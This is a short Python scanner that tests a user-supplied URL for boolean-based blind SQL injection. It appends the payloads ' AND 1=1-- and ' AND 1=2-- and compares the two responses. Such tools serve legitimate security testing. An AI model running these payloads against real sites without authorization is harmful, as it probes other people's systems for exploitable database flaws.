import requests

def scan(url):
    print(f"[*] Scanning {url} for Boolean-Based Blind SQLi")
    payload_true = "' AND 1=1--"
    payload_false = "' AND 1=2--"

    try:
        r_true = requests.get(url + payload_true, timeout=5)
        r_false = requests.get(url + payload_false, timeout=5)

        if r_true.text != r_false.text:
            print("[!] Possible Boolean-Based Blind SQL Injection Found")
            print(f"URL: {url}")
            print(f"Payload: '{payload_true}' / '{payload_false}'")
            return

    except requests.exceptions.RequestException:
        pass

    print("[-] No Boolean-Based Blind SQLi detected")

if __name__ == "__main__":
    target = input("Enter target URL (with parameter): ")
    scan(target)
